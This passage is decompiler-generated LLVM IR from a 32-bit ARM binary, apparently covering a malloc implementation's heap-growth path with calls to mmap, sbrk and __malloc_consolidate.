  store i32 %v3_16fe8, i32* @r4, align 4
  %v1_16fec = load i32, i32* @r5, align 4
  %v4_16fec = mul i32 %v1_16fec, 4
  %v5_16fec = add i32 %v4_16fec, %v4_16fe4
  store i32 %v5_16fec, i32* %r3.global-to-local, align 4
  %v1_16ff0 = add i32 %v0_17018, 8
  store i32 %v1_16ff0, i32* %r0.global-to-local, align 4
  %v2_16ff4 = mul i32 %v0_16ff4, 2
  store i32 %v2_16ff4, i32* %ip.global-to-local, align 4
  %v2_16ff8 = add i32 %v5_16fec, 820
  %v3_16ff8 = inttoptr i32 %v2_16ff8 to i32*
  store i32 %v3_16fe8, i32* %v3_16ff8, align 4
  %v0_16f78.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_16f80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16f78

dec_label_pc_17000:                               ; preds = %dec_label_pc_16fd4
  %v1_17000 = add i32 %v3_16fd4, 4
  %v2_17000 = inttoptr i32 %v1_17000 to i32*
  %v3_17000 = load i32, i32* %v2_17000, align 4
  store i32 %v3_17000, i32* %r3.global-to-local, align 4
  %v1_17004 = and i32 %v3_17000, -4
  store i32 %v1_17004, i32* %r2.global-to-local, align 4
  %v0_17008 = load i32, i32* @sl, align 4
  %v2_17008 = sub i32 %v1_17004, %v0_17008
  store i32 %v2_17008, i32* %ip.global-to-local, align 4
  %v1_1700c = add i32 %v3_16fd4, 12
  %v2_1700c = inttoptr i32 %v1_1700c to i32*
  %v3_1700c = load i32, i32* %v2_1700c, align 4
  store i32 %v3_1700c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_17008, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_17000
  %v6_17014 = add i32 %v1_17004, %v3_16fd4
  store i32 %v6_17014, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_17000, %bb143
  %v2_17018 = add i32 %v3_1700c, 8
  %v3_17018 = inttoptr i32 %v2_17018 to i32*
  store i32 %v0_17018, i32* %v3_17018, align 4
  %v0_1701c = load i32, i32* %r3.global-to-local, align 4
  %v1_1701c = load i32, i32* %r0.global-to-local, align 4
  %v2_1701c = add i32 %v1_1701c, 12
  %v3_1701c = inttoptr i32 %v2_1701c to i32*
  store i32 %v0_1701c, i32* %v3_1701c, align 4
  %v4_17020 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_16efc_crit_edge, label %dec_label_pc_1702c

.dec_label_pc_16efc_crit_edge:                    ; preds = %bb144
  %v5_17020 = add i32 %v4_17020, 8
  store i32 %v5_17020, i32* %r4.global-to-local, align 4
  %v4_17024 = load i32, i32* %r2.global-to-local, align 4
  %v5_17024 = add i32 %v4_17024, 4
  %v6_17024 = inttoptr i32 %v5_17024 to i32*
  %v7_17024 = load i32, i32* %v6_17024, align 4
  store i32 %v7_17024, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16efc

dec_label_pc_1702c:                               ; preds = %bb144
  %v1_1702c = load i32, i32* @sl, align 4
  %v2_1702c = add i32 %v1_1702c, %v4_17020
  store i32 %v2_1702c, i32* %r1.global-to-local, align 4
  %v1_17034 = load i32, i32* @r6, align 4
  %v2_17034 = add i32 %v1_17034, 8
  %v3_17034 = inttoptr i32 %v2_17034 to i32*
  store i32 %v2_1702c, i32* %v3_17034, align 4
  %v0_17038 = load i32, i32* %r1.global-to-local, align 4
  %v1_17038 = load i32, i32* @r6, align 4
  %v2_17038 = add i32 %v1_17038, 12
  %v3_17038 = inttoptr i32 %v2_17038 to i32*
  store i32 %v0_17038, i32* %v3_17038, align 4
  %v0_1703c = load i32, i32* @r6, align 4
  %v1_1703c = load i32, i32* %r1.global-to-local, align 4
  %v2_1703c = add i32 %v1_1703c, 8
  %v3_1703c = inttoptr i32 %v2_1703c to i32*
  store i32 %v0_1703c, i32* %v3_1703c, align 4
  %v0_17040 = load i32, i32* @r6, align 4
  %v1_17040 = load i32, i32* %r1.global-to-local, align 4
  %v2_17040 = add i32 %v1_17040, 12
  %v3_17040 = inttoptr i32 %v2_17040 to i32*
  store i32 %v0_17040, i32* %v3_17040, align 4
  %tmp210 = icmp ult i32 %v1_1702c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_1702c
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  %v8_1704c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v8_1704c, i32* %r3.global-to-local, align 4
  %v4_17050 = load i32, i32* %r1.global-to-local, align 4
  %v6_17050 = add i32 %v8_1704c, 48
  %v7_17050 = inttoptr i32 %v6_17050 to i32*
  store i32 %v4_17050, i32* %v7_17050, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_1702c, %bb145
  %v0_17054 = load i32, i32* @sl, align 4
  %v1_17054 = or i32 %v0_17054, 1
  store i32 %v1_17054, i32* %r2.global-to-local, align 4
  %v0_17058 = load i32, i32* %ip.global-to-local, align 4
  %v1_17058 = or i32 %v0_17058, 1
  store i32 %v1_17058, i32* %r3.global-to-local, align 4
  %v0_1705c = load i32, i32* @lr, align 4
  %v1_1705c = add i32 %v0_1705c, 8
  store i32 %v1_1705c, i32* %r4.global-to-local, align 4
  %v2_17060 = add i32 %v0_1705c, 4
  %v3_17060 = inttoptr i32 %v2_17060 to i32*
  store i32 %v1_17054, i32* %v3_17060, align 4
  %v0_17064 = load i32, i32* %ip.global-to-local, align 4
  %v1_17064 = load i32, i32* %r1.global-to-local, align 4
  %v3_17064 = add i32 %v1_17064, %v0_17064
  %v4_17064 = inttoptr i32 %v3_17064 to i32*
  store i32 %v0_17064, i32* %v4_17064, align 4
  %v0_17068 = load i32, i32* %r3.global-to-local, align 4
  %v1_17068 = load i32, i32* %r1.global-to-local, align 4
  %v2_17068 = add i32 %v1_17068, 4
  %v3_17068 = inttoptr i32 %v2_17068 to i32*
  store i32 %v0_17068, i32* %v3_17068, align 4
  br label %dec_label_pc_174c4

dec_label_pc_17070.loopexit:                      ; preds = %dec_label_pc_16f90
  br label %dec_label_pc_17070

dec_label_pc_17070:                               ; preds = %dec_label_pc_17070.loopexit, %dec_label_pc_16c84, %dec_label_pc_16c8c
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  %v4_17078 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_17078, i32* @r0, align 4
  %v1_1707c = add i32 %v4_17078, 44
  %v2_1707c = inttoptr i32 %v1_1707c to i32*
  %v3_1707c = load i32, i32* %v2_1707c, align 4
  store i32 %v3_1707c, i32* %ip.global-to-local, align 4
  %v1_17080 = add i32 %v3_1707c, 4
  %v2_17080 = inttoptr i32 %v1_17080 to i32*
  %v3_17080 = load i32, i32* %v2_17080, align 4
  %v0_17084 = load i32, i32* @sl, align 4
  %v1_17084 = add i32 %v0_17084, 16
  store i32 %v1_17084, i32* %r1.global-to-local, align 4
  %v1_17088 = and i32 %v3_17080, -4
  store i32 %v1_17088, i32* %r3.global-to-local, align 4
  %v3_1708c = icmp ult i32 %v1_17088, %v1_17084
  br i1 %v3_1708c, label %dec_label_pc_170bc, label %dec_label_pc_17098

dec_label_pc_17098:                               ; preds = %dec_label_pc_17070
  %v2_17098 = sub i32 %v1_17088, %v0_17084
  %v2_1709c = add i32 %v0_17084, %v3_1707c
  store i32 %v2_1709c, i32* %r1.global-to-local, align 4
  %v1_170a0 = or i32 %v2_17098, 1
  store i32 %v1_170a0, i32* %r3.global-to-local, align 4
  %v1_170a4 = or i32 %v0_17084, 1
  store i32 %v1_170a4, i32* %r2.global-to-local, align 4
  %v1_170a8 = add i32 %v3_1707c, 8
  store i32 %v1_170a8, i32* %r4.global-to-local, align 4
  store i32 %v1_170a4, i32* %v2_17080, align 4
  %v0_170b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_170b0 = load i32, i32* @r0, align 4
  %v2_170b0 = add i32 %v1_170b0, 44
  %v3_170b0 = inttoptr i32 %v2_170b0 to i32*
  store i32 %v0_170b0, i32* %v3_170b0, align 4
  %v0_170b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_170b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_170b4 = add i32 %v1_170b4, 4
  %v3_170b4 = inttoptr i32 %v2_170b4 to i32*
  store i32 %v0_170b4, i32* %v3_170b4, align 4
  br label %dec_label_pc_174c4

dec_label_pc_170bc:                               ; preds = %dec_label_pc_17070
  %v1_170bc = inttoptr i32 %v4_17078 to i32*
  %v2_170bc = load i32, i32* %v1_170bc, align 4
  store i32 %v2_170bc, i32* %r3.global-to-local, align 4
  %v1_170c0 = and i32 %v2_170bc, 2
  store i32 %v1_170c0, i32* %ip.global-to-local, align 4
  %v2_170c0 = icmp eq i32 %v1_170c0, 0
  %v1_170c4 = add i32 %v4_17078, 860
  %v2_170c4 = inttoptr i32 %v1_170c4 to i32*
  %v3_170c4 = load i32, i32* %v2_170c4, align 4
  store i32 %v3_170c4, i32* %r1.global-to-local, align 4
  br i1 %v2_170c0, label %dec_label_pc_170dc, label %dec_label_pc_170cc

dec_label_pc_170cc:                               ; preds = %dec_label_pc_170bc
  %v0_170cc = call i32 @__malloc_consolidate()
  %v0_170d0 = load i32, i32* @sl, align 4
  %v1_170d0 = add i32 %v0_170d0, -7
  store i32 %v1_170d0, i32* %r0.global-to-local, align 4
  %v1_170d4 = call i32 @malloc(i32 %v1_170d0)
  store i32 %v1_170d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174c0

dec_label_pc_170dc:                               ; preds = %dec_label_pc_170bc
  %v1_170dc = add i32 %v4_17078, 844
  %v2_170dc = inttoptr i32 %v1_170dc to i32*
  %v3_170dc = load i32, i32* %v2_170dc, align 4
  store i32 %v3_170dc, i32* %r3.global-to-local, align 4
  %v3_170e0 = icmp ult i32 %v0_17084, %v3_170dc
  %v1_170e4 = add i32 %v3_170c4, -1
  store i32 %v1_170e4, i32* %sb.global-to-local, align 4
  br i1 %v3_170e0, label %dec_label_pc_171b8, label %dec_label_pc_170ec

dec_label_pc_170ec:                               ; preds = %dec_label_pc_170dc
  %v1_170ec = add i32 %v4_17078, 852
  %v2_170ec = inttoptr i32 %v1_170ec to i32*
  %v3_170ec = load i32, i32* %v2_170ec, align 4
  store i32 %v3_170ec, i32* %r2.global-to-local, align 4
  %v1_170f0 = add i32 %v4_17078, 848
  %v2_170f0 = inttoptr i32 %v1_170f0 to i32*
  %v3_170f0 = load i32, i32* %v2_170f0, align 4
  store i32 %v3_170f0, i32* %r3.global-to-local, align 4
  %v6_170f8 = icmp slt i32 %v3_170f0, %v3_170ec
  br i1 %v6_170f8, label %dec_label_pc_170fc, label %dec_label_pc_171b8

dec_label_pc_170fc:                               ; preds = %dec_label_pc_170ec
  %v1_170fc = add i32 %v0_17084, 10
  %v2_17100 = add i32 %v1_170fc, %v3_170c4
  store i32 %v2_17100, i32* %r3.global-to-local, align 4
  %v2_17104 = sub i32 0, %v3_170c4
  %v3_17104 = and i32 %v2_17100, %v2_17104
  store i32 %v3_17104, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_17104, %v0_17084
  br i1 %tmp211, label %dec_label_pc_17110, label %dec_label_pc_171b8

dec_label_pc_17110:                               ; preds = %dec_label_pc_170fc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_17104, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_17128 = call i32 @mmap(i32 0, i32 %v3_17104, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_17128, i32* %r0.global-to-local, align 4
  %v7_1712c = icmp eq i32 %v6_17128, -1
  br i1 %v7_1712c, label %dec_label_pc_17110.dec_label_pc_171b8_crit_edge, label %dec_label_pc_17134

dec_label_pc_17110.dec_label_pc_171b8_crit_edge:  ; preds = %dec_label_pc_17110
  %v1_171dc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_171b8

dec_label_pc_17134:                               ; preds = %dec_label_pc_17110
  %v1_17134 = urem i32 %v6_17128, 8
  store i32 %v1_17134, i32* %r2.global-to-local, align 4
  %v2_17134 = icmp eq i32 %v1_17134, 0
  br i1 %v2_17134, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_17134
  %v2_17138 = sub nsw i32 8, %v1_17134
  store i32 %v2_17138, i32* %r3.global-to-local, align 4
  %v2_1713c = load i32, i32* @r4, align 4
  %v3_1713c = sub i32 %v2_1713c, %v2_17138
  %v3_17140 = add i32 %v2_17138, %v6_17128
  store i32 %v3_17140, i32* %lr.global-to-local, align 4
  %v2_17148 = or i32 %v3_1713c, 2
  store i32 %v2_17148, i32* %r2.global-to-local, align 4
  %v5_17150 = inttoptr i32 %v3_17140 to i32*
  store i32 %v2_17138, i32* %v5_17150, align 4
  %v1_17154 = load i32, i32* %r2.global-to-local, align 4
  %v2_17154 = load i32, i32* %lr.global-to-local, align 4
  %v3_17154 = add i32 %v2_17154, 4
  %v4_17154 = inttoptr i32 %v3_17154 to i32*
  store i32 %v1_17154, i32* %v4_17154, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_17134
  store i32 %v6_17128, i32* %lr.global-to-local, align 4
  %v1_1714c47 = load i32, i32* @r4, align 4
  %v2_1714c48 = or i32 %v1_1714c47, 2
  store i32 %v2_1714c48, i32* %r3.global-to-local, align 4
  %v3_17158 = inttoptr i32 %v6_17128 to i32*
  store i32 0, i32* %v3_17158, align 4
  %v1_1715c = load i32, i32* %r3.global-to-local, align 4
  %v2_1715c = load i32, i32* %lr.global-to-local, align 4
  %v3_1715c = add i32 %v2_1715c, 4
  %v4_1715c = inttoptr i32 %v3_1715c to i32*
  store i32 %v1_1715c, i32* %v4_1715c, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_17168 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_17168, i32* %ip.global-to-local, align 4
  %v1_1716c = add i32 %v4_17168, 848
  %v2_1716c = inttoptr i32 %v1_1716c to i32*
  %v3_1716c = load i32, i32* %v2_1716c, align 4
  store i32 %v3_1716c, i32* %r3.global-to-local, align 4
  %v1_17170 = add i32 %v4_17168, 856
  %v2_17170 = inttoptr i32 %v1_17170 to i32*
  %v3_17170 = load i32, i32* %v2_17170, align 4
  store i32 %v3_17170, i32* %r2.global-to-local, align 4
  %v1_17174 = add i32 %v3_1716c, 1
  store i32 %v1_17174, i32* %r3.global-to-local, align 4
  %v7_1717c = icmp sgt i32 %v1_17174, %v3_17170
  br i1 %v7_1717c, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_17174, i32* %v2_17170, align 4
  %v0_17180.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_17180.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_17180 = phi i32 [ %v4_17168, %.thread27 ], [ %v1_17180.pre, %bb147 ]
  %v0_17180 = phi i32 [ %v1_17174, %.thread27 ], [ %v0_17180.pre, %bb147 ]
  %v2_17180 = add i32 %v1_17180, 848
  %v3_17180 = inttoptr i32 %v2_17180 to i32*
  store i32 %v0_17180, i32* %v3_17180, align 4
  %v0_17184 = load i32, i32* %ip.global-to-local, align 4
  %v1_17184 = add i32 %v0_17184, 868
  %v2_17184 = inttoptr i32 %v1_17184 to i32*
  %v3_17184 = load i32, i32* %v2_17184, align 4
  store i32 %v3_17184, i32* %r3.global-to-local, align 4
  %v1_17188 = add i32 %v0_17184, 880
  %v2_17188 = inttoptr i32 %v1_17188 to i32*
  %v3_17188 = load i32, i32* %v2_17188, align 4
  store i32 %v3_17188, i32* %r2.global-to-local, align 4
  %v0_1718c = load i32, i32* @r4, align 4
  %v2_1718c = add i32 %v0_1718c, %v3_17184
  store i32 %v2_1718c, i32* %r1.global-to-local, align 4
  %v1_17190 = add i32 %v0_17184, 872
  %v2_17190 = inttoptr i32 %v1_17190 to i32*
  %v3_17190 = load i32, i32* %v2_17190, align 4
  store i32 %v3_17190, i32* %r3.global-to-local, align 4
  %v1_17198 = add i32 %v0_17184, 884
  %v2_17198 = inttoptr i32 %v1_17198 to i32*
  %v3_17198 = load i32, i32* %v2_17198, align 4
  store i32 %v3_17198, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_1718c, %v3_17188
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_1718c, i32* %v2_17188, align 4
  %v0_171a0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_171a0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_171a0 = phi i32 [ %v0_17184, %bb148 ], [ %v1_171a0.pre, %bb149 ]
  %v0_171a0 = phi i32 [ %v2_1718c, %bb148 ], [ %v0_171a0.pre, %bb149 ]
  %v2_171a0 = add i32 %v1_171a0, 868
  %v3_171a0 = inttoptr i32 %v2_171a0 to i32*
  store i32 %v0_171a0, i32* %v3_171a0, align 4
  %v0_171a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_171a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_171a4 = add i32 %v1_171a4, %v0_171a4
  store i32 %v2_171a4, i32* %r1.global-to-local, align 4
  %v1_171a8 = load i32, i32* %r2.global-to-local, align 4
  %v0_171ac = load i32, i32* %lr.global-to-local, align 4
  %v1_171ac = add i32 %v0_171ac, 8
  store i32 %v1_171ac, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_171a4, %v1_171a8
  br i1 %tmp213, label %bb151, label %dec_label_pc_174c0

bb151:                                            ; preds = %bb150
  %v5_171b0 = load i32, i32* %ip.global-to-local, align 4
  %v6_171b0 = add i32 %v5_171b0, 884
  %v7_171b0 = inttoptr i32 %v6_171b0 to i32*
  store i32 %v2_171a4, i32* %v7_171b0, align 4
  br label %dec_label_pc_174c0

dec_label_pc_171b8:                               ; preds = %dec_label_pc_170fc, %dec_label_pc_170dc, %dec_label_pc_17110.dec_label_pc_171b8_crit_edge, %dec_label_pc_170ec
  %v1_171dc = phi i32 [ %v1_171dc.pre, %dec_label_pc_17110.dec_label_pc_171b8_crit_edge ], [ %v0_17084, %dec_label_pc_170ec ], [ %v0_17084, %dec_label_pc_170dc ], [ %v0_17084, %dec_label_pc_170fc ]
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  %v4_171c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_171c0, i32* %r3.global-to-local, align 4
  %v1_171c4 = add i32 %v4_171c0, 44
  %v2_171c4 = inttoptr i32 %v1_171c4 to i32*
  %v3_171c4 = load i32, i32* %v2_171c4, align 4
  store i32 %v3_171c4, i32* %r0.global-to-local, align 4
  %v1_171c8 = add i32 %v4_171c0, 864
  %v2_171c8 = inttoptr i32 %v1_171c8 to i32*
  %v3_171c8 = load i32, i32* %v2_171c8, align 4
  store i32 %v3_171c8, i32* %r2.global-to-local, align 4
  %v1_171cc = add i32 %v4_171c0, 840
  %v2_171cc = inttoptr i32 %v1_171cc to i32*
  %v3_171cc = load i32, i32* %v2_171cc, align 4
  store i32 %v3_171cc, i32* %r3.global-to-local, align 4
  %v1_171d0 = add i32 %v3_171c4, 4
  %v2_171d0 = inttoptr i32 %v1_171d0 to i32*
  %v3_171d0 = load i32, i32* %v2_171d0, align 4
  store i32 %v3_171d0, i32* %r1.global-to-local, align 4
  %v1_171d8 = urem i32 %v3_171c8, 2
  %v2_171d8 = icmp eq i32 %v1_171d8, 0
  %v1_171d4 = add i32 %v1_171dc, 16
  %v2_171dc = add i32 %v1_171d4, %v3_171cc
  store i32 %v2_171dc, i32* %r3.global-to-local, align 4
  %v1_171e0 = and i32 %v3_171d0, -4
  store i32 %v1_171e0, i32* @r8, align 4
  br i1 %v2_171d8, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_171b8
  %v3_171e4 = sub i32 %v2_171dc, %v1_171e0
  store i32 %v3_171e4, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_171b8, %bb152
  %v0_171e8 = phi i32 [ %v2_171dc, %dec_label_pc_171b8 ], [ %v3_171e4, %bb152 ]
  %v1_171e8 = load i32, i32* %sb.global-to-local, align 4
  %v2_171e8 = add i32 %v1_171e8, %v0_171e8
  store i32 %v2_171e8, i32* %r3.global-to-local, align 4
  %v1_171ec = sub i32 -1, %v1_171e8
  store i32 %v1_171ec, i32* %fp.global-to-local, align 4
  %v2_171f0 = and i32 %v2_171e8, %v1_171ec
  store i32 %v2_171f0, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_171f0, 1
  br i1 %tmp154, label %dec_label_pc_17214, label %dec_label_pc_17200

dec_label_pc_17200:                               ; preds = %bb153
  store i32 %v2_171f0, i32* %r0.global-to-local, align 4
  %v1_17204 = call i32 @__GI_sbrk(i32 %v2_171f0)
  store i32 %v1_17204, i32* %r0.global-to-local, align 4
  %v3_17208 = icmp eq i32 %v1_17204, -1
  store i32 %v1_17204, i32* @r4, align 4
  br i1 %v3_17208, label %dec_label_pc_17214, label %dec_label_pc_17280

dec_label_pc_17214:                               ; preds = %dec_label_pc_17200, %bb153
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r1.global-to-local, align 4
  %v4_1721c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_1721c, i32* %r6.global-to-local, align 4
  %v1_17220 = add i32 %v4_1721c, 864
  %v2_17220 = inttoptr i32 %v1_17220 to i32*
  %v3_17220 = load i32, i32* %v2_17220, align 4
  store i32 %v3_17220, i32* %r3.global-to-local, align 4
  %v1_17224 = urem i32 %v3_17220, 2
  %v2_17224 = icmp eq i32 %v1_17224, 0
  br i1 %v2_17224, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_17214
  %v1_17228 = load i32, i32* @r8, align 4
  %v2_17228 = load i32, i32* %sb.global-to-local, align 4
  %v3_17228 = add i32 %v2_17228, %v1_17228
  %v2_1722c = load i32, i32* @r5, align 4
  %v3_1722c = add i32 %v3_17228, %v2_1722c
  store i32 %v3_1722c, i32* %r3.global-to-local, align 4
  %v2_17230 = load i32, i32* %fp.global-to-local, align 4
  %v3_17230 = and i32 %v2_17230, %v3_1722c
  store i32 %v3_17230, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_17214
  %v0_17234.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_17234 = phi i32 [ %v0_17234.pr, %.thread29thread-pre-split ], [ %v3_17230, %bb155 ]
  %v2_17234 = icmp ugt i32 %v0_17234, 1048575
  br i1 %v2_17234, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_1724c = phi i32 [ %v0_17234, %.thread29 ], [ 1048576, %bb156 ]
  %v1_1723c = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_1724c, %v1_1723c
  br i1 %tmp214, label %dec_label_pc_17244, label %dec_label_pc_174a8

dec_label_pc_17244:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1724c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_17260 = call i32 @mmap(i32 0, i32 %v0_1724c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_17260, i32* %r0.global-to-local, align 4
  %v3_17264 = icmp eq i32 %v6_17260, -1
  %v8_17264 = icmp eq i32 %v6_17260, -1
  store i32 %v6_17260, i32* @r4, align 4
  br i1 %v8_17264, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_17244
  %v1_1726c = load i32, i32* %r6.global-to-local, align 4
  %v2_1726c = add i32 %v1_1726c, 864
  %v3_1726c = inttoptr i32 %v2_1726c to i32*
  %v4_1726c = load i32, i32* %v3_1726c, align 4
  %v2_17270 = load i32, i32* @r5, align 4
  %v3_17270 = add i32 %v2_17270, %v6_17260
  store i32 %v3_17270, i32* %r0.global-to-local, align 4
  %v2_17274 = and i32 %v4_1726c, -2
  store i32 %v2_17274, i32* %r3.global-to-local, align 4
  store i32 %v2_17274, i32* %v3_1726c, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_17244, %bb158
  br i1 %v3_17264, label %dec_label_pc_17280, label %dec_label_pc_17284

dec_label_pc_17280:                               ; preds = %.thread32, %dec_label_pc_17200
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17284

dec_label_pc_17284:                               ; preds = %.thread32, %dec_label_pc_17280
  %v0_17284 = load i32, i32* @r4, align 4
  %v7_17284 = icmp eq i32 %v0_17284, -1
  br i1 %v7_17284, label %dec_label_pc_174a8, label %dec_label_pc_1728c

dec_label_pc_1728c:                               ; preds = %dec_label_pc_17284
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  %v4_17294 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_17294, i32* %ip.global-to-local, align 4
  store i32 %v3_171c4, i32* %r2.global-to-local, align 4
  %v1_1729c = add i32 %v4_17294, 872
  %v2_1729c = inttoptr i32 %v1_1729c to i32*
  %v3_1729c = load i32, i32* %v2_1729c, align 4
  %v1_172a0 = load i32, i32* @r8, align 4
  %v2_172a0 = add i32 %v1_172a0, %v3_171c4
  store i32 %v2_172a0, i32* %r1.global-to-local, align 4
  %v0_172a4 = load i32, i32* @r5, align 4
  %v2_172a4 = add i32 %v0_172a4, %v3_1729c
  store i32 %v2_172a4, i32* %r3.global-to-local, align 4
  %v9_172a8 = icmp eq i32 %v0_17284, %v2_172a0
  br i1 %v9_172a8, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_1728c
  store i32 %v2_172a4, i32* %v2_1729c, align 4
  br label %dec_label_pc_172c4

bb159:                                            ; preds = %dec_label_pc_1728c
  %v1_172ac = load i32, i32* %r0.global-to-local, align 4
  %v8_172ac = icmp eq i32 %v1_172ac, -1
  store i32 %v2_172a4, i32* %v2_1729c, align 4
  br i1 %v8_172ac, label %.thread34, label %dec_label_pc_172c4

.thread34:                                        ; preds = %bb159
  %v1_172b4 = load i32, i32* @r5, align 4
  %v2_172b4 = load i32, i32* @r8, align 4
  %v3_172b4 = add i32 %v2_172b4, %v1_172b4
  %v2_172b8 = or i32 %v3_172b4, 1
  store i32 %v2_172b8, i32* %r3.global-to-local, align 4
  %v2_172bc = load i32, i32* %r2.global-to-local, align 4
  %v3_172bc = add i32 %v2_172bc, 4
  %v4_172bc = inttoptr i32 %v3_172bc to i32*
  store i32 %v2_172b8, i32* %v4_172bc, align 4
  br label %dec_label_pc_1743c

dec_label_pc_172c4:                               ; preds = %bb159, %.thread122
  %v0_172c8.pr = load i32, i32* @r8, align 4
  %v0_172c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_172c4 = add i32 %v0_172c4, 864
  %v2_172c4 = inttoptr i32 %v1_172c4 to i32*
  %v3_172c4 = load i32, i32* %v2_172c4, align 4
  store i32 %v3_172c4, i32* %r2.global-to-local, align 4
  %v2_172c8 = icmp eq i32 %v0_172c8.pr, 0
  br i1 %v2_172c8, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_172c4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_172c4
  %v2_172d0 = urem i32 %v3_172c4, 2
  store i32 %v2_172d0, i32* %r3.global-to-local, align 4
  %v2_172d4 = icmp eq i32 %v2_172d0, 0
  br i1 %v2_172d4, label %.thread40, label %dec_label_pc_172dc

dec_label_pc_172dc:                               ; preds = %.thread36
  %v0_172dc = load i32, i32* @r4, align 4
  %v1_172dc = load i32, i32* %r1.global-to-local, align 4
  %v3_172dc = icmp ult i32 %v0_172dc, %v1_172dc
  br i1 %v3_172dc, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_172dc
  %v2_172e0 = and i32 %v3_172c4, -2
  store i32 %v2_172e0, i32* %r3.global-to-local, align 4
  store i32 %v2_172e0, i32* %v2_172c4, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_172dc, %.thread37, %.thread36, %bb160
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  %v4_172f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
